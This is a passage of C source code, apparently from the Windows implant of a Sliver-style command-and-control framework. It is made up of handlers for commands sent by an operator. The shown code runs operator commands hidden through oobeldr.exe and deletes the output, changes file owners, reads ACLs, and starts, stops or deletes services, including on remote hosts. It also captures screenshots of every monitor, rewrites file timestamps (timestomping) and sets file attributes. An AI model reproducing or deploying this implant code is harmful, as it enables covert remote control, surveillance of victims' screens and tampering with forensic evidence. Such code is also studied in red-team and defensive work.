		pCmdElements[i]->dwFieldIdx = i + 1;
		pCmdElements[i]->Type = Varint;
	}
	
	pCmdElements[0]->Type = Bytes;
	UnmarshaledData = UnmarshalStruct(pCmdElements, _countof(pCmdElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	if (UnmarshaledData[1] != NULL) {
		ExecuteNow = TRUE;
		dwTimeout = 120;
	}

	if (UnmarshaledData[2] != NULL) {
		SaveOutput = TRUE;
	}

	lpCommand = DuplicateStrA(((PBUFFER)UnmarshaledData[0])->pBuffer, 0);
	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
	pConfig = pSession->pGlobalConfig;
	lpInputPath = StrAppendW(pConfig->lpSliverPath, L"\\Scripts\\");
	lpInputPath = StrCatExW(lpInputPath, pConfig->lpUniqueName);

	lpErrorPath = DuplicateStrW(lpInputPath, 4);
	lpOutputPath = DuplicateStrW(lpInputPath, 4);
	lstrcatW(lpErrorPath, L".err");
	lstrcatW(lpOutputPath, L".out");
	lpInputPath = StrCatExW(lpInputPath, L".cmd");
	if (!WriteToFile(lpInputPath, lpCommand, lstrlenA(lpCommand))) {
		goto CLEANUP;
	}

	if (ExecuteNow) {
		ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\oobe", wszOobePath, _countof(wszOobePath));
		lpOobeldrPath = DuplicateStrW(wszOobePath, lstrlenW(L"\\oobeldr.exe"));
		lstrcatW(lpOobeldrPath, L"\\oobeldr.exe");
		SecureZeroMemory(&si, sizeof(si));
		SecureZeroMemory(&pi, sizeof(pi));
		si.cb = sizeof(si);
		si.wShowWindow = SW_HIDE;
		if (!CreateProcessW(lpOobeldrPath, NULL, NULL, NULL, FALSE, 0, NULL, wszOobePath, &si, &pi)) {
			LOG_ERROR("CreateProcessW", GetLastError());
			goto CLEANUP;
		}

		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}

	GetTempPathW(_countof(wszTempPath), wszTempPath);
	wszTempPath[lstrlenW(wszTempPath) - 1] = L'\0';
	for (i = 0; i < dwTimeout; i++) {
		if (IsFileExist(lpOutputPath)) {
			if (SaveOutput) {
				lpTemp1 = CopyFileToFolder(lpOutputPath, wszTempPath);
				lpTemp2 = ConvertWcharToChar(lpTemp1);
				RespElements[0] = CreateBytesElement(lpTemp2, lstrlenA(lpTemp2), 1);
				FREE(lpTemp1);
				FREE(lpTemp2);
			}
			else {
				pOutputData = ReadFromFile(lpOutputPath, &cbOutputData);
				RespElements[0] = CreateBytesElement(pOutputData, cbOutputData, 1);
			}
			
			if (IsFileExist(lpErrorPath)) {
				if (SaveOutput) {
					lpTemp1 = CopyFileToFolder(lpErrorPath, wszTempPath);
					lpTemp2 = ConvertWcharToChar(lpTemp1);
					RespElements[1] = CreateBytesElement(lpTemp2, lstrlenA(lpTemp2), 2);
					FREE(lpTemp1);
					FREE(lpTemp2);
				}
				else {
					pErrorData = ReadFromFile(lpErrorPath, &cbErrorData);
					RespElements[1] = CreateBytesElement(pErrorData, cbErrorData, 2);
				}
			}

			break;
		}
		
		Sleep(1000);
	}

	pFinalElement = CreateStructElement(RespElements, _countof(RespElements), 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (lpOutputPath != NULL) {
		DeleteFileW(lpOutputPath);
	}

	if (lpErrorPath != NULL) {
		DeleteFileW(lpErrorPath);
	}

	for (i = 0; i < _countof(pCmdElements); i++) {
		FREE(pCmdElements[i]);
	}

	if (UnmarshaledData != NULL) {
		FreeBuffer(UnmarshaledData[0]);
		FREE(UnmarshaledData);
	}

	FreeElement(pFinalElement);
	FREE(lpOobeldrPath);
	FREE(lpCommand);
	FREE(lpInputPath);
	FREE(lpOutputPath);
	FREE(lpErrorPath);
	FREE(pOutputData);
	FREE(pErrorData);

	return pResult;
}

BOOL ChownHandlerCallback
(
	_In_ LPWSTR lpPath,
	_In_ LPSTR lpUserName
)
{
	SetFileOwner(lpPath, lpUserName);

	return FALSE;
}

PENVELOPE ChownHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement ReqElements[3];
	PENVELOPE pResult = NULL;
	LPVOID* UnmarshaledData = NULL;
	DWORD i = 0;
	LPWSTR lpPath = NULL;
	LPSTR lpUserName = NULL;
	BOOL Recursive = FALSE;
	BOOL IsFolder = FALSE;

	for (i = 0; i < _countof(ReqElements); i++) {
		ReqElements[i] = ALLOC(sizeof(PBElement));
		ReqElements[i]->dwFieldIdx = i + 1;
		ReqElements[i]->Type = Bytes;
	}

	ReqElements[2]->Type = Varint;
	UnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL) {
		goto CLEANUP;
	}

	lpPath = ConvertCharToWchar(((PBUFFER)UnmarshaledData[0])->pBuffer);
	lpUserName = DuplicateStrA(((PBUFFER)UnmarshaledData[1])->pBuffer, 0);
	if (!IsPathExist(lpPath)) {
		LogError(L"%s is not found", lpPath);
		goto CLEANUP;
	}

	if (IsFolderExist(lpPath)) {
		IsFolder = TRUE;
	}

	if (IsFolder && UnmarshaledData[2] != NULL) {
		Recursive = TRUE;
	}

	if (!SetFileOwner(lpPath, lpUserName)) {
		goto CLEANUP;
	}

	if (IsFolder && Recursive) {
		ListFileEx(lpPath, LIST_RECURSIVELY, (LIST_FILE_CALLBACK)ChownHandlerCallback, lpUserName);
	}

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	FREE(lpUserName);
	FREE(lpPath);
	for (i = 0; i < _countof(ReqElements); i++) {
		FREE(ReqElements[i]);
	}

	if (UnmarshaledData != NULL) {
		FREE(UnmarshaledData[0]);
		FREE(UnmarshaledData);
	}

	return pResult;
}

PENVELOPE IcaclsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pRecvElement = NULL;
	PBUFFER* UnmarshaledData = NULL;
	LPSTR lpPath = NULL;
	LPWSTR lpTempPath = NULL;
	PENVELOPE pResult = NULL;
	PACL pAcl = NULL;
	PACE_HEADER pAceHdr = NULL;
	DWORD i = 0;
	PSID pSid = NULL;
	LPSTR lpSidName = NULL;
	LPSTR lpRespData = NULL;
	DWORD dwMask = 0;
	PPBElement pFinalElement = NULL;

	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = Bytes;
	pRecvElement->dwFieldIdx = 1;

	UnmarshaledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	lpPath = DuplicateStrA(UnmarshaledData[0]->pBuffer, 0);
	lpTempPath = ConvertCharToWchar(lpPath);
	if (!IsPathExist(lpTempPath)) {
		LogError(L"%s is not exist\n", lpTempPath);
		goto CLEANUP;
	}

	pAcl = GetFileDacl(lpTempPath);
	pAceHdr = (PACE_HEADER)(&pAcl[1]);
	for (i = 0; i < pAcl->AceCount; i++) {
		pSid = (PSID)((ULONG_PTR)pAceHdr + 8);
		if (IsValidSid(pSid)) {
			lpSidName = LookupNameOfSid(pSid, TRUE);
			if (lpSidName != NULL) {
				lpRespData = StrCatExA(lpRespData, lpSidName);
				lpRespData = StrCatExA(lpRespData, ":");
			}
		}

		if (pAceHdr->AceFlags & INHERITED_ACE) {
			lpRespData = StrCatExA(lpRespData, "(I)");
		}

		if (pAceHdr->AceFlags & OBJECT_INHERIT_ACE) {
			lpRespData = StrCatExA(lpRespData, "(OI)");
		}

		if (pAceHdr->AceFlags & CONTAINER_INHERIT_ACE) {
			lpRespData = StrCatExA(lpRespData, "(CI)");
		}

		if (pAceHdr->AceFlags & NO_PROPAGATE_INHERIT_ACE) {
			lpRespData = StrCatExA(lpRespData, "(NP)");
		}

		if (pAceHdr->AceFlags & INHERIT_ONLY_ACE) {
			lpRespData = StrCatExA(lpRespData, "(IO)");
		}

		if (pAceHdr->AceFlags & CRITICAL_ACE_FLAG) {
			lpRespData = StrCatExA(lpRespData, "(CR)");
		}

		dwMask = *(PDWORD)((ULONG_PTR)pAceHdr + sizeof(ACE_HEADER));
		if (pAceHdr->AceType == ACCESS_DENIED_ACE_TYPE) {
			dwMask |= SYNCHRONIZE;
		}

		lpRespData = StrCatExA(lpRespData, "(");
		if (pAceHdr->AceType < SYSTEM_AUDIT_ACE_TYPE || (pAceHdr->AceType > SYSTEM_SCOPED_POLICY_ID_ACE_TYPE && pAceHdr->AceType <= SYSTEM_ACCESS_FILTER_ACE_TYPE)) {
			if (dwMask == 0x1F01FF || dwMask == GENERIC_ALL) {
				if (pAceHdr->AceType == ACCESS_ALLOWED_ACE_TYPE) {
					lpRespData = StrCatExA(lpRespData, "F,");
				}
				else {
					lpRespData = StrCatExA(lpRespData, "N,");
				}

				dwMask = 0;
			}

			if ((dwMask & 0x1301BF) == 0x1301BF) {
				lpRespData = StrCatExA(lpRespData, "M,");
				dwMask &= ~0x1301BF;
			}

			if ((dwMask & 0x1200A9) == 0x1200A9) {
				lpRespData = StrCatExA(lpRespData, "RX,");
				dwMask &= ~0x1200A9;
			}
			else if ((dwMask & 0x120089) == 0x120089) {
				lpRespData = StrCatExA(lpRespData, "R,");
				dwMask &= ~0x120089;
			}

			if ((dwMask & 0x100116) == 0x100116) {
				lpRespData = StrCatExA(lpRespData, "W,");
				dwMask &= ~0x100116;
			}

			if ((dwMask & 0xE0010000) == 0xE0010000) {
				lpRespData = StrCatExA(lpRespData, "M,");
				dwMask &= ~0xE0010000;
			}

			if ((dwMask & 0x110000) == 0x110000) {
				lpRespData = StrCatExA(lpRespData, "D,");
				dwMask &= ~0x110000;
			}
		}
		else if (pAceHdr->AceType == SYSTEM_MANDATORY_LABEL_ACE_TYPE) {
			if (dwMask & 1) {
				lpRespData = StrCatExA(lpRespData, "NW,");
				dwMask &= ~1;
			}

			if (dwMask & 2) {
				lpRespData = StrCatExA(lpRespData, "NR,");
				dwMask &= ~2;
			}

			if (dwMask & 4) {
				lpRespData = StrCatExA(lpRespData, "NX,");
				dwMask &= ~4;
			}
		}

		if ((dwMask & DELETE) == DELETE) {
			lpRespData = StrCatExA(lpRespData, "DE,");
			dwMask &= ~DELETE;
		}

		if ((dwMask & READ_CONTROL) == READ_CONTROL) {
			lpRespData = StrCatExA(lpRespData, "Rc,");
			dwMask &= ~READ_CONTROL;
		}

		if ((dwMask & WRITE_DAC) == WRITE_DAC) {
			lpRespData = StrCatExA(lpRespData, "WDAC,");
			dwMask &= ~WRITE_DAC;
		}

		if ((dwMask & WRITE_OWNER) == WRITE_OWNER) {
			lpRespData = StrCatExA(lpRespData, "WO,");
			dwMask &= ~WRITE_OWNER;
		}

		if ((dwMask & SYNCHRONIZE) == SYNCHRONIZE) {
			lpRespData = StrCatExA(lpRespData, "S,");
			dwMask &= ~SYNCHRONIZE;
		}

		if ((dwMask & ACCESS_SYSTEM_SECURITY) == ACCESS_SYSTEM_SECURITY) {
			lpRespData = StrCatExA(lpRespData, "AS,");
			dwMask &= ~ACCESS_SYSTEM_SECURITY;
		}

		if ((dwMask & MAXIMUM_ALLOWED) == MAXIMUM_ALLOWED) {
			lpRespData = StrCatExA(lpRespData, "MA,");
			dwMask &= ~MAXIMUM_ALLOWED;
		}

		if ((dwMask & GENERIC_READ) == GENERIC_READ) {
			lpRespData = StrCatExA(lpRespData, "GR,");
			dwMask &= ~GENERIC_READ;
		}

		if ((dwMask & GENERIC_WRITE) == GENERIC_WRITE) {
			lpRespData = StrCatExA(lpRespData, "GW,");
			dwMask &= ~GENERIC_WRITE;
		}

		if ((dwMask & GENERIC_EXECUTE) == GENERIC_EXECUTE) {
			lpRespData = StrCatExA(lpRespData, "GE,");
			dwMask &= ~GENERIC_EXECUTE;
		}

		if ((dwMask & GENERIC_ALL) == GENERIC_ALL) {
			lpRespData = StrCatExA(lpRespData, "GA,");
			dwMask &= ~GENERIC_ALL;
		}

		if ((dwMask & FILE_READ_DATA) == FILE_READ_DATA) {
			lpRespData = StrCatExA(lpRespData, "RD,");
			dwMask &= ~FILE_READ_DATA;
		}

		if ((dwMask & FILE_WRITE_DATA) == FILE_WRITE_DATA) {
			lpRespData = StrCatExA(lpRespData, "WD,");
			dwMask &= ~FILE_WRITE_DATA;
		}

		if ((dwMask & FILE_APPEND_DATA) == FILE_APPEND_DATA) {
			lpRespData = StrCatExA(lpRespData, "AD,");
			dwMask &= ~FILE_APPEND_DATA;
		}

		if ((dwMask & FILE_READ_EA) == FILE_READ_EA) {
			lpRespData = StrCatExA(lpRespData, "REA,");
			dwMask &= ~FILE_READ_EA;
		}

		if ((dwMask & FILE_WRITE_EA) == FILE_WRITE_EA) {
			lpRespData = StrCatExA(lpRespData, "WEA,");
			dwMask &= ~FILE_WRITE_EA;
		}

		if ((dwMask & FILE_EXECUTE) == FILE_EXECUTE) {
			lpRespData = StrCatExA(lpRespData, "X,");
			dwMask &= ~FILE_EXECUTE;
		}

		if ((dwMask & FILE_DELETE_CHILD) == FILE_DELETE_CHILD) {
			lpRespData = StrCatExA(lpRespData, "DC,");
			dwMask &= ~FILE_DELETE_CHILD;
		}

		if ((dwMask & FILE_READ_ATTRIBUTES) == FILE_READ_ATTRIBUTES) {
			lpRespData = StrCatExA(lpRespData, "RA,");
			dwMask &= ~FILE_READ_ATTRIBUTES;
		}

		if ((dwMask & FILE_WRITE_ATTRIBUTES) == FILE_WRITE_ATTRIBUTES) {
			lpRespData = StrCatExA(lpRespData, "WA,");
			dwMask &= ~FILE_WRITE_ATTRIBUTES;
		}

		lpRespData[lstrlenA(lpRespData) - 1] = ')';
		lpRespData = StrCatExA(lpRespData, "\n");
		pAceHdr = (PACE_HEADER)((ULONG_PTR)pAceHdr + pAceHdr->AceSize);
	}

	pFinalElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (UnmarshaledData != NULL) {
		FreeBuffer(UnmarshaledData[0]);
		FREE(UnmarshaledData);
	}

	FREE(lpPath);
	FREE(pAcl);
	FREE(lpTempPath);
	FREE(lpRespData);
	FreeElement(pRecvElement);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE StartServiceHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	LPVOID* pUnmarshaledData = NULL;
	PPBElement ReqElements[2];
	SC_HANDLE hService = NULL;
	DWORD i = 0;
	SC_HANDLE hScManager = NULL;
	PPBElement RecvElementList[2];
	LPSTR lpServiceName = NULL;
	LPSTR lpHostname = NULL;

	for (i = 0; i < _countof(ReqElements); i++) {
		ReqElements[i] = ALLOC(sizeof(PBElement));
		ReqElements[i]->dwFieldIdx = i + 1;
		ReqElements[i]->Type = Bytes;
	}

	pUnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pUnmarshaledData == NULL || pUnmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	lpServiceName = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
	if (pUnmarshaledData[1] != NULL) {
		lpHostname = DuplicateStrA(((PBUFFER)pUnmarshaledData[1])->pBuffer, 0);
	}

	hScManager = OpenSCManagerA(lpHostname, NULL, SC_MANAGER_ALL_ACCESS);
	if (hScManager == NULL) {
		LOG_ERROR("OpenSCManagerA", GetLastError());
		goto CLEANUP;
	}

	hService = OpenServiceA(hScManager, lpServiceName, SERVICE_START);
	if (hService == NULL) {
		LOG_ERROR("OpenServiceA", GetLastError());
		goto CLEANUP;
	}

	if (!StartServiceA(hService, 0, NULL)) {
		LOG_ERROR("StartServiceA", GetLastError());
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	FREE(lpServiceName);
	FREE(lpHostname);

	for (i = 0; i < _countof(ReqElements); i++) {
		FREE(ReqElements[i]);
		FREE(pUnmarshaledData[i]);
	}

	FREE(pUnmarshaledData);
	if (hScManager != NULL) {
		CloseServiceHandle(hScManager);
	}

	if (hService != NULL) {
		CloseServiceHandle(hService);
	}

	return pResult;
}

PENVELOPE RemoveServiceHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	LPVOID* pUnmarshaledData = NULL;
	PPBElement ReqElements[2];
	SC_HANDLE hService = NULL;
	DWORD i = 0;
	SC_HANDLE hScManager = NULL;
	PPBElement RecvElementList[2];
	LPSTR lpServiceName = NULL;
	LPSTR lpHostname = NULL;

	for (i = 0; i < _countof(ReqElements); i++) {
		ReqElements[i] = ALLOC(sizeof(PBElement));
		ReqElements[i]->dwFieldIdx = i + 1;
		ReqElements[i]->Type = Bytes;
	}

	pUnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pUnmarshaledData == NULL || pUnmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	lpServiceName = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
	if (pUnmarshaledData[1] != NULL) {
		lpHostname = DuplicateStrA(((PBUFFER)pUnmarshaledData[1])->pBuffer, 0);
	}

	hScManager = OpenSCManagerA(lpHostname, NULL, SC_MANAGER_ALL_ACCESS);
	if (hScManager == NULL) {
		LOG_ERROR("OpenSCManagerA", GetLastError());
		goto CLEANUP;
	}

	hService = OpenServiceA(hScManager, lpServiceName, DELETE);
	if (hService == NULL) {
		LOG_ERROR("OpenServiceA", GetLastError());
		goto CLEANUP;
	}

	if (!DeleteService(hService)) {
		LOG_ERROR("DeleteService", GetLastError());
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	FREE(lpServiceName);
	FREE(lpHostname);

	for (i = 0; i < _countof(ReqElements); i++) {
		FREE(ReqElements[i]);
		FREE(pUnmarshaledData[i]);
	}

	FREE(pUnmarshaledData);
	if (hScManager != NULL) {
		CloseServiceHandle(hScManager);
	}

	if (hService != NULL) {
		CloseServiceHandle(hService);
	}

	return pResult;
}

PENVELOPE StopServiceHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	LPVOID* pUnmarshaledData = NULL;
	PPBElement ReqElements[2];
	DWORD i = 0;
	PPBElement RecvElementList[2];
	LPSTR lpServiceName = NULL;
	LPSTR lpHostname = NULL;

	for (i = 0; i < _countof(ReqElements); i++) {
		ReqElements[i] = ALLOC(sizeof(PBElement));
		ReqElements[i]->dwFieldIdx = i + 1;
		ReqElements[i]->Type = Bytes;
	}

	pUnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pUnmarshaledData == NULL || pUnmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	lpServiceName = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
	if (pUnmarshaledData[1] != NULL) {
		lpHostname = DuplicateStrA(((PBUFFER)pUnmarshaledData[1])->pBuffer, 0);
	}

	if (!StopService(lpServiceName, lpHostname)) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	FREE(lpServiceName);
	FREE(lpHostname);

	for (i = 0; i < _countof(ReqElements); i++) {
		FREE(ReqElements[i]);
		FREE(pUnmarshaledData[i]);
	}

	FREE(pUnmarshaledData);

	return pResult;
}

BOOL MonitorEnumProc
(
	_In_ HMONITOR hMonitor,
	_In_ HDC hDC,
	_In_ LPRECT lpMonitorRect,
	_In_ PBUFFER** pParam
)
{
	PBUFFER pBitmapBuffer = NULL;
	PBUFFER* pBufferList = NULL;
	DWORD dwNumberOfBuffers = 0;
	//WCHAR wszPath[0x200] = L"C:\\Users\\Admin\\Desktop\\screenshot.";

	dwNumberOfBuffers = *((PDWORD)pParam);
	pBufferList = pParam[1];
	pBitmapBuffer = CaptureDesktop(hDC, lpMonitorRect->left, lpMonitorRect->top);
	if (pBitmapBuffer != NULL) {
		if (pBufferList == NULL) {
			pBufferList = ALLOC(sizeof(PBUFFER*));
		}
		else {
			pBufferList = REALLOC(pBufferList, sizeof(PBUFFER*) * (dwNumberOfBuffers + 1));
		}

		/*lstrcatW(wszPath, GenRandomStrW(4));
		lstrcatW(wszPath, L".bmp");
		PrintFormatW(L"%s\n", wszPath);
		WriteToFile(wszPath, pBitmapBuffer->pBuffer, pBitmapBuffer->cbBuffer);*/
		pBufferList[dwNumberOfBuffers++] = pBitmapBuffer;
		*((PDWORD)pParam) = dwNumberOfBuffers;
		pParam[1] = pBufferList;
	}

	return TRUE;
}

PENVELOPE ScreenshotHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	HDC hDesktopDC = NULL;
	PBUFFER** pParam = NULL;
	PBUFFER* BufferList = NULL;
	DWORD dwNumberOfBuffers = 0;
	PPBElement pFinalElement = NULL;
	DWORD i = 0;

	hDesktopDC = GetDC(NULL);
	if (hDesktopDC == NULL) {
		LOG_ERROR("GetDC", GetLastError());
		goto CLEANUP;
	}

	pParam = ALLOC(sizeof(PBUFFER*) * 2);
	if (!EnumDisplayMonitors(hDesktopDC, NULL, (MONITORENUMPROC)MonitorEnumProc, (LPARAM)pParam)) {
		LOG_ERROR("EnumDisplayMonitors", GetLastError());
		goto CLEANUP;
	}

	BufferList = pParam[1];
	dwNumberOfBuffers = (DWORD)pParam[0];
	if (BufferList == NULL || dwNumberOfBuffers == 0) {
		goto CLEANUP;
	}

	pFinalElement = CreateRepeatedBytesElement(BufferList, dwNumberOfBuffers, 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	FreeElement(pFinalElement);
	FREE(pParam);
	if (BufferList != NULL) {
		for (i = 0; i < dwNumberOfBuffers; i++) {
			FREE(BufferList[i]);
		}

		FREE(BufferList);
	}

	if (hDesktopDC != NULL) {
		ReleaseDC(NULL, hDesktopDC);
	}

	return pResult;
}

PENVELOPE ChtimesHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement ReqElements[4];
	PPBElement pFinalElement = NULL;
	DWORD i = 0;
	PENVELOPE pResult = NULL;
	LPVOID* UnmarshaledData = NULL;
	LPWSTR lpPath = NULL;
	BOOL IsDirectory = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	FILETIME CreationTime;
	FILETIME LastAccessTime;
	FILETIME LastWriteTime;
	SYSTEMTIME Temp;
	INT UTCOffset = 0;
	PBUFFER pTemp = NULL;

	UTCOffset = GetUTFOffset();
	for (i = 0; i < _countof(ReqElements); i++) {
		ReqElements[i] = ALLOC(sizeof(PBElement));
		ReqElements[i]->dwFieldIdx = i + 1;
		ReqElements[i]->Type = Varint;
	}

	ReqElements[0]->Type = Bytes;
	UnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	pTemp = (PBUFFER)UnmarshaledData[0];
	lpPath = ConvertCharToWchar(pTemp->pBuffer);
	if (!IsPathExist(lpPath)) {
		LogError(L"%s is not exist", lpPath);
		goto CLEANUP;
	}

	if (!IsFileExist(lpPath)) {
		IsDirectory = TRUE;
	}

	if (IsDirectory) {
		hFile = CreateFileW(lpPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	}
	else {
		hFile = CreateFileW(lpPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	}

	if (hFile == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateFileW", GetLastError());
		goto CLEANUP;
	}

	if (!GetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime)) {
		LOG_ERROR("GetFileTime", GetLastError());
		goto CLEANUP;
	}

	if (UnmarshaledData[1] != NULL) {
		memcpy(&CreationTime, &UnmarshaledData[1], sizeof(FILETIME));
		FileTimeToSystemTime(&CreationTime, &Temp);
		Temp.wHour -= UTCOffset;
		SystemTimeToFileTime(&Temp, &CreationTime);
	}

	if (UnmarshaledData[2] != NULL) {
		memcpy(&LastAccessTime, &UnmarshaledData[2], sizeof(FILETIME));
		FileTimeToSystemTime(&LastAccessTime, &Temp);
		Temp.wHour -= UTCOffset;
		SystemTimeToFileTime(&Temp, &LastAccessTime);
	}

	if (UnmarshaledData[3] != NULL) {
		memcpy(&LastWriteTime, &UnmarshaledData[3], sizeof(FILETIME));
		FileTimeToSystemTime(&LastWriteTime, &Temp);
		Temp.wHour -= UTCOffset;
		SystemTimeToFileTime(&Temp, &LastWriteTime);
	}

	if (!SetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime)) {
		LOG_ERROR("SetFileTime", GetLastError());
		goto CLEANUP;
	}

	pFinalElement = CreateBytesElement(pTemp->pBuffer, pTemp->cbBuffer, 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	FreeElement(pFinalElement);
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
	}

	FREE(lpPath);
	for (i = 0; i < _countof(ReqElements); i++) {
		FREE(ReqElements[i]);
	}

	if (UnmarshaledData != NULL) {
		FREE(UnmarshaledData[0]);
		FREE(UnmarshaledData);
	}

	return pResult;
}

PENVELOPE AttribHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement ReqElements[2];
	DWORD i = 0;
	PENVELOPE pResult = NULL;
	LPVOID* UnmarshaledData = NULL;
	LPWSTR lpPath = NULL;
	DWORD dwNewAttrib = 0;

#ifdef _DEBUG
	PBUFFER pTemp = NULL;
#endif

	for (i = 0; i < _countof(ReqElements); i++) {
		ReqElements[i] = ALLOC(sizeof(PBElement));
		ReqElements[i]->dwFieldIdx = i + 1;
	}

	ReqElements[0]->Type = Bytes;
	ReqElements[1]->Type = Varint;
	UnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL) {
		goto CLEANUP;
	}

#ifdef _DEBUG
	pTemp = (PBUFFER)UnmarshaledData[0];
	HexDump(pTemp->pBuffer, pTemp->cbBuffer);
	lpPath = ConvertCharToWchar(pTemp->pBuffer);
	HexDump(lpPath, lstrlenW(lpPath) * sizeof(WCHAR));
	HexDump(pTemp->pBuffer, pTemp->cbBuffer);
#endif
	dwNewAttrib = (DWORD)UnmarshaledData[1];
	if (!IsPathExist(lpPath)) {
		LogError(L"%s is not found", lpPath);
		goto CLEANUP;
	}
	
	if (!SetFileAttributesW(lpPath, dwNewAttrib)) {
		LOG_ERROR("SetFileAttributesW", GetLastError());
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	FREE(lpPath);
	for (i = 0; i < _countof(ReqElements); i++) {
		FREE(ReqElements[i]);
	}

	if (UnmarshaledData != NULL) {
		FREE(UnmarshaledData[0]);
		FREE(UnmarshaledData);
	}

	return pResult;
}

//PENVELOPE PivotStartListenerHandler
//(
//	_In_ PENVELOPE pEnvelope,
//	_In_ LPVOID lpSliverClient
//)
//{
//	PENVELOPE pResult = NULL;
//	PPBElement PivotStartListenerReq[3];
//	PPBElement RespElements[4];
//	PPBElement pFinalElement = NULL;
//	DWORD i = 0;
//	LPVOID* UnmarshaledData = NULL;
//	UINT64 uPivotType = 0;
//	LPSTR lpBindAddress = NULL;
//	PBOOL pOptions = NULL;
//	UINT64 uNumberOfOptions = 0;
//	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
//	PGLOBAL_CONFIG pConfig = NULL;
//	PPIVOT_LISTENER pListener = NULL;
//
//	for (i = 0; i < _countof(PivotStartListenerReq); i++) {
//		PivotStartListenerReq[i] = ALLOC(sizeof(PBElement));
//		PivotStartListenerReq[i]->dwFieldIdx = i + 1;
//	}
//
//	PivotStartListenerReq[0]->Type = Varint;
//	PivotStartListenerReq[1]->Type = Bytes;
//	PivotStartListenerReq[2]->Type = RepeatedVarint;
//	UnmarshaledData = UnmarshalStruct(PivotStartListenerReq, _countof(PivotStartListenerReq), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
//	if (UnmarshaledData == NULL) {
//		goto CLEANUP;
//	}
//
//	uPivotType = (UINT64)(UnmarshaledData[0]);
//	lpBindAddress = DuplicateStrA(((PBUFFER)(UnmarshaledData[1]))->pBuffer, 0);
//	if (UnmarshaledData[2] != NULL) {
